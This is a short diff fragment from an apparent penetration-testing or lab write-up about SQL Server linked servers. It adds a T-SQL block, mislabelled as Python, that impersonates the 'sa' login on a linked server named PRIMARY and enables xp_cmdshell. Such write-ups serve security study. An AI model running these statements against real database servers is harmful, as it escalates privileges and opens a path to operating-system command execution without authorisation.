@@ -1079,3 +1079,15 @@ WHERE prm.permission_name = ''IMPERSONATE'';
 
 Running this query im checking for any impersonation on that linked server, as seen from the screenshot `bridge_corp` can impersonate `sa` on the linked server
 
+```python
+EXEC ('
+EXECUTE AS LOGIN = ''sa'';
+EXEC sp_configure ''show advanced options'', 1;
+RECONFIGURE;
+EXEC sp_configure ''xp_cmdshell'', 1;
+RECONFIGURE;
+') AT [PRIMARY];
+```
+
+Ill enabled xp_cmdshell on the linked server using impersonation
+
